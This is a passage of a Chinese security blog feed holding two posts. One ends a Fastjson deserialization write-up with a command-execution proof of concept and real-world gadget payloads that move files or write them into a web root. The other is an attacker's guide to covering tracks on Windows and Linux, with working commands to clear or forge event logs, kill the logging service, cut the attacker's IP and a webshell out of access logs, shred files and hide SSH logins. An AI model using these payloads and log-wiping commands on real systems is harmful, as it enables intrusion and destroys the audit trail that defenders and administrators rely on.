System.out.println(JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;\n&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行后弹计算器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907204915990.png" alt="image-20210907204915990"></p><p>我们通过调试来看看具体是怎么个回事</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>于checkautotype 处下断点。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224439952.png" alt="image-20210907224439952"></p><p>可以发现传入的typename是 AutoCloseable。此时的expectClass是NULL</p><p>往下，直接从缓存Mapping可以直接获得此类，</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224744679.png" alt="image-20210907224744679"></p><p>然后直接被return了，甚至没有走autoTypeSupport校验。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225106968.png" alt="image-20210907225106968"></p><p>clazz被return到了defaultjsonparser里，往下看逻辑可以发现从对clazz进行了一个deserialze方法，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225448517.png" alt="image-20210907225448517"></p><p>会跟到这里来</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908010408177.png" alt="image-20210908010408177"></p><p>往下看，会因为由Autocloseable不能通过getSeeAlso方法成功生成deserializer对象，从而触发第二轮checkAutoType</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013610732.png" alt="image-20210908013610732"></p><p>第二轮传入checkAutoType的参数依次为 第二个@type值，第一个@type值，和一个不重要的lexer.getFeatures()</p><p>进来checkAutoType后，会先对exceptclass进行白名单校验，Autocloseable类自然是随便过掉，然后使exceptClassFlag置为true</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013751407.png" alt="image-20210908013751407"></p><p>随后便是一些对typename的黑白名单校验，由于typename是org.example.VulAutoCloseable，不在黑白名单中，所以校验自然都通过了。<br>以下是依次的校验顺序</p><p>黑名单校验</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014110837.png" alt="image-20210908014110837"></p><p>先白后黑，其中所有的Array.binarySearch结果都是0，自然就能通过IF条件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014001405.png" alt="image-20210908014001405"></p><p>先黑后白</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014440625.png" alt="image-20210908014440625"></p><p>冲破重重考研，typename指定类被传入TypeUtils.loadClass,跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014625797.png" alt="image-20210908014625797"></p><p>会来到这里，VulAutoCloseable的类对象被返回</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015237563.png" alt="image-20210908015237563"></p><p>然后会对这个类对象进行校验，校验是否为ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015331781.png" alt="image-20210908015331781"></p><p>然后判断clazz是否是exceptClass的子类，是的话就直接返回类对象。类对象被返回后，就会进入被反序列化的下一个过程，它的构造方法等会被调用，从而完成利用。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015543198.png" alt="image-20210908015543198"></p><h4 id="实战Gadget"><a href="#实战Gadget" class="headerlink" title="实战Gadget"></a>实战Gadget</h4><p>实战中用的payload:</p><p>文件移动：将一个文件中的内容移动到新的一个文件中去，原来文件的内容消失。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.9.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;D:&#x2F;b.txt&quot;, &quot;targetPath&quot;:&quot;E:&#x2F;b.txt&quot;&#125;</span><br></pre></td></tr></table></figure><p>文件写入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.sleepycat&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;je&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;5.0.73&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.esotericsoftware&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;kryo&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.0.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.9.5&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;hacked.txt&quot;, \\创建一个空文件</span><br><span class="line">        &quot;tempPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;test.txt&quot;\\创建一个有内容的文件</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;cHduZWQ&#x3D;&quot;, \\base64后的文件内容</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;&#125; 在49以下才能触发，因为这个gadget在49被禁止了，可用于检测具体版本</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h3 id="报错检测"><a href="#报错检测" class="headerlink" title="报错检测"></a>报错检测</h3><p>运气好可以直接出版本号</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;xxx&quot;:&quot;aaa&quot;</span><br><span class="line">eyJhIjoiXHgaGiJ9的base64解码 在60以下才能触发，当后端 Fastjson 版本小于 1.2.60 时，使用该请求包不会延时不会报错，反之则会延迟或报错</span><br></pre></td></tr></table></figure><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><p>有些开发人员在写解析JSON的相关代码时，可能会设置只能传入指定对象。<br>而我们通过设置@type时传入的对象可能会与指定对象不匹配从而发生type not match的异常。</p><p>解决办法是这样,最外层套层对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;xxx&quot;: &#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p><p><a href="https://www.freebuf.com/vuls/228099.html">https://www.freebuf.com/vuls/228099.html</a></p><p><a href="https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87</a></p><p><a href="https://paper.seebug.org/1192/#1225">https://paper.seebug.org/1192/#1225</a></p><p><a href="https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC">https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC</a></p><p><a href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89">https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FastJSON-简介&quot;&gt;&lt;a href=&quot;#FastJSON-简介&quot; class=&quot;headerlink&quot; title=&quot;FastJSON 简介&quot;&gt;&lt;/a&gt;FastJSON 简介&lt;/h1&gt;&lt;p&gt;FastJson 是一个由阿里巴巴研发的java库，可以把java对</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>win&amp;linux 日志系统与清除</title>
    <link href="http://const27.com/2021/09/03/windows&amp;linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/"/>
    <id>http://const27.com/2021/09/03/windows&amp;linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/</id>
    <published>2021-09-03T13:09:34.996Z</published>
    <updated>2021-09-03T13:17:41.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WINDOWS-日志"><a href="#WINDOWS-日志" class="headerlink" title="WINDOWS 日志"></a>WINDOWS 日志</h1><p>Windows日志有许多细分类：<br>windows事件日志，IIS日志，FTP日志，防火墙日志等等。</p><h2 id="事件查看器"><a href="#事件查看器" class="headerlink" title="事件查看器"></a>事件查看器</h2><p>windows系统自带一个叫做事件查看器的工具，它可以分析所有的windows系统日志。<br>运行-&gt;eventvwr 即可打开。<br>它把日志分为了两种，一个是WINDOWS日志，一个是“应用程序和服务日志”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726133040331.png" alt="image-20210726133040331"></p><p>事件查看器内置有三个核心日志文件：SYSTEM,SECURITY,APPLICATION。他们的默认最大容量为20MB.</p><h3 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726133715232.png" alt="image-20210726133715232"></p><p>事件查看器把时间分类为了五种类型：</p><p>信息（Information）</p><p>信息事件指应用程序、驱动程序或服务的成功操作的事件。</p><p>警告（Warning）</p><p>警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。</p><p>错误（Error）</p><p>错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如,如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。</p><p>成功审核（Success audit）</p><p>成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录/注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“ 成功审核”事件。</p><p>失败审核（Failure audit）</p><p>失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。</p><h2 id="删除日志"><a href="#删除日志" class="headerlink" title="删除日志"></a>删除日志</h2><p>Windows并没有直接提供删除特点日志的功能，事件查看器也只提供了一个清除日志的选项，原因是日志记录的ID是连续的，默认的排序方式是从大到小往下排列。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726134334720.png" alt="image-20210726134334720"></p><h3 id="清空日志"><a href="#清空日志" class="headerlink" title="清空日志"></a>清空日志</h3><p>暴力一点，可以直接把日志全部删除。</p><p>开始→运行,输入 <code>eventvwr</code> 进入事件查看器，右边栏选择清除日志。</p><p>或者通过powershell选定日志删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（a）PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security,&#39;windows powershell&#39;&#125;&quot;</span><br><span class="line">（b）Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br></pre></td></tr></table></figure><p>嫌powershell太长可以用wevtutil</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil el             列出系统中所有日志名称</span><br><span class="line">wevtutil cl system      清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security    清理安全日志</span><br></pre></td></tr></table></figure><h3 id="日志伪造"><a href="#日志伪造" class="headerlink" title="日志伪造"></a>日志伪造</h3><p>可以通过eventcreate这个自带工具伪造日志或者自定义大量垃圾信息覆盖现有日志（日志最大容量20MB）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span><br></pre></td></tr></table></figure><h3 id="暂停日志记录"><a href="#暂停日志记录" class="headerlink" title="暂停日志记录"></a>暂停日志记录</h3><p>可以通过工具<a href="https://github.com/hlldz/Invoke-Phant0m%EF%BC%8C%E6%9D%A5%E4%BD%BF%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E7%BB%88%E6%AD%A2%E3%80%82%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E4%BB%85%E6%94%AF%E6%8C%81X64">https://github.com/hlldz/Invoke-Phant0m，来使日志记录终止。这个工具仅支持X64</a></p><p>该脚本遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以杀死事件日志服务线程。因此，系统将无法收集日志。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726140507925.png" alt="image-20210726140507925"></p><p>随后新增用户，发现日志中无记录，看来日志记录确实是被终止了。</p><h3 id="单条日志清除"><a href="#单条日志清除" class="headerlink" title="单条日志清除"></a>单条日志清除</h3><p><a href="https://github.com/QAX-A-Team/EventCleaner">https://github.com/QAX-A-Team/EventCleaner</a></p><p>这个工具也可以暂停日志线程停止日志记录，同时也可以恢复日志线程。但是更重要的是它可以删除单挑日志记录</p><p>官方描述</p><ol><li>EventCleaner closehandle  解除 security.evtx的文件占坑</li><li>EventCleaner 100 删除ID为100的日志(必须在之前使用EventCleaner  closehandle)</li><li>EventCleaner suspend 暂停日志线程,停止日志记录</li><li>do anything without worrying about logs</li><li>EventCleaner normal 恢复日志线程</li><li>delete EventCleaner</li></ol><h2 id="各日志位置及手动清除"><a href="#各日志位置及手动清除" class="headerlink" title="各日志位置及手动清除"></a>各日志位置及手动清除</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">路径 %SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span><br></pre></td></tr></table></figure><p>清除WWW日志(其实并不需要停止服务都能删)：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">停止服务：net stop w3svc</span><br><span class="line">删除日志目录下所有文件：del *.*</span><br><span class="line">启用服务：net start w3svc</span><br></pre></td></tr></table></figure><h3 id="应用程序日志，安全日志，系统日志"><a href="#应用程序日志，安全日志，系统日志" class="headerlink" title="应用程序日志，安全日志，系统日志"></a>应用程序日志，安全日志，系统日志</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%systemroot%\system32\config\AppEvent.EVT;</span><br><span class="line">%systemroot%\system32\config\SecEvent.EVT;</span><br><span class="line">%systemroot%\system32\config\SysEvent.EVT;</span><br></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%systemroot%\system32\logfiles\msftpsvc1\</span><br></pre></td></tr></table></figure><h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>直接嫖脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f # 删除Default中的所有值</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; &#x2F;f # 删除整个Servers</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; 重新创建删除的注册表项</span><br><span class="line">cd %userprofile%\documents\ # 转到Default.rdp文件目录</span><br><span class="line">attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏</span><br><span class="line">del Default.rdp  # 删除文件Default.rdp文件</span><br></pre></td></tr></table></figure><h2 id="彻底删除日志"><a href="#彻底删除日志" class="headerlink" title="彻底删除日志"></a>彻底删除日志</h2><p>如何彻底删除日志？要知道仅仅是普通的删除命令实际上是并不能做到完全删除的，很容易被找到删除文件。</p><h3 id="Cipher-命令多次覆写"><a href="#Cipher-命令多次覆写" class="headerlink" title="Cipher 命令多次覆写"></a>Cipher 命令多次覆写</h3><p>在删除文件后，可以利用Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间，彻底删除数据防止被恢复。比如</p><p>刚刚删除<code>D:\tools</code>目录下的文件，执行<code>cipher /w:D:\tools</code>，D 盘上未使用空间就会被覆盖三次：一次 0x00、一次 0xFF，一次随机数，所有被删除的文件就都不可能被恢复了。</p><h3 id="Format命令覆盖格式化"><a href="#Format命令覆盖格式化" class="headerlink" title="Format命令覆盖格式化"></a><strong>Format命令覆盖格式化</strong></h3><p>Format 命令加上 /P 参数后，就会把每个扇区先清零，再用随机数覆盖。而且可以覆盖多次。比如</p><p><code>format D: /P:8</code>就表示把 D 盘用随机数覆盖 8 次。</p><h1 id="LINUX-日志"><a href="#LINUX-日志" class="headerlink" title="LINUX 日志"></a>LINUX 日志</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</span><br><span class="line">/<span class="keyword">var</span>/log/secure 与安全相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/maillog 与邮件相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/cron 与定时任务相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/spooler 与UUCP和news设备相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/boot.log 守护进程启动和停止相关的日志消息</span><br><span class="line">/<span class="keyword">var</span>/log/wtmp 该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件,用last查看</span><br><span class="line">/<span class="keyword">var</span>/log/btmp   记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">/<span class="keyword">var</span>/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">/<span class="keyword">var</span>/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">~/.bash_history 执行的命令,用 histroy -c 即可删除</span><br></pre></td></tr></table></figure><h2 id="清空日志-1"><a href="#清空日志-1" class="headerlink" title="清空日志"></a>清空日志</h2><p>清除用户最后一次登录时间：echo &gt; /var/log/lastlog          #lastlog命令<br>清除当前登录用户的信息：echo &gt;   /var/log/utmp             #使用w,who,users等命令<br>清除安全日志记录：cat /dev/null &gt;  /var/log/secure<br>清除系统日志记录：cat /dev/null &gt;  /var/log/message</p><p>诸如此类…</p><h2 id="替换-删除部分日志"><a href="#替换-删除部分日志" class="headerlink" title="替换/删除部分日志"></a>替换/删除部分日志</h2><p>日志文件被清空会引起管理员警觉，所以可以只替换或删除关键信息，实现隐秘攻击的目的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span><br><span class="line">sed  -i &#39;&#x2F;自己的ip&#x2F;&#39;d  &#x2F;var&#x2F;log&#x2F;messages</span><br><span class="line"></span><br><span class="line"># 全局替换登录IP地址：</span><br><span class="line">sed -i &#39;s&#x2F;192.168.166.85&#x2F;192.168.1.1&#x2F;g&#39; secure</span><br><span class="line"></span><br><span class="line">对于WEB服务还可以这样隐藏我们的马</span><br><span class="line"># 使用grep -v来把我们的相关信息删除,</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"></span><br><span class="line"># 把修改过的日志覆盖到原日志文件</span><br><span class="line">cat tmp.log &gt; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;</span><br></pre></td></tr></table></figure><h2 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h2><h3 id="shred"><a href="#shred" class="headerlink" title="shred"></a>shred</h3><p>-n 指定覆写次数，默认3次</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shred -f -u -z -v -n 8 1.txt </span><br></pre></td></tr></table></figure><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p>这个命令用于清空文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;要删除的文件</span><br></pre></td></tr></table></figure><h3 id="wipe"><a href="#wipe" class="headerlink" title="wipe"></a>wipe</h3><p>很简单易用，但是一般不是装机自带</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wipe filename</span><br></pre></td></tr></table></figure><h3 id="Secure-Delete"><a href="#Secure-Delete" class="headerlink" title="Secure-Delete"></a><strong>Secure-Delete</strong></h3><p>secure-delete是一个集成化工具包，收录了些安全删除文件的命令行工具。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srm filename</span><br><span class="line">sfill &#x2F;a   用随机数填充空闲或者可用的空间，保证没有可恢复的文件或文件夹</span><br></pre></td></tr></table></figure><p>sswap用于安全地清除交换分区。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;swaps 找到交换分区</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726184935968.png" alt="image-20210726184935968"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sswap &#x2F;www&#x2F;swap</span><br></pre></td></tr></table></figure><p>smem用于清理在内存中的内容，提供安全地内存清理:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smem</span><br></pre></td></tr></table></figure><h2 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h2><p>ssh -T <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#57;&#x39;&#46;&#49;&#x32;&#51;">&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#57;&#x39;&#46;&#49;&#x32;&#51;</a> /usr/bin/bash -i</p><p>-T表示不分配伪终端，/usr/bin/bash -i 表示在登录后调用bash命令 -i 表示是交互式shel，这样登陆将不会在w/last命令结果中显示.</p><p>但是会被lsof -i:22 和 ps |grep ssh 等命令发现</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726190433565.png" alt="image-20210726190433565"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WINDOWS-日志&quot;&gt;&lt;a href=&quot;#WINDOWS-日志&quot; class=&quot;headerlink&quot; title=&quot;WINDOWS 日志&quot;&gt;&lt;/a&gt;WINDOWS 日志&lt;/h1&gt;&lt;p&gt;Windows日志有许多细分类：&lt;br&gt;windows事件日志，IIS日志，</summary>
      
    
    
    
    
    <category term="系统相关与免杀" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>基础免杀手法暴风吸入</title>
    <link href="http://const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/"/>
    <id>http://const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/</id>
    <published>2021-09-03T13:08:31.882Z</published>
    <updated>2021-09-03T13:18:40.381Z</updated>
    
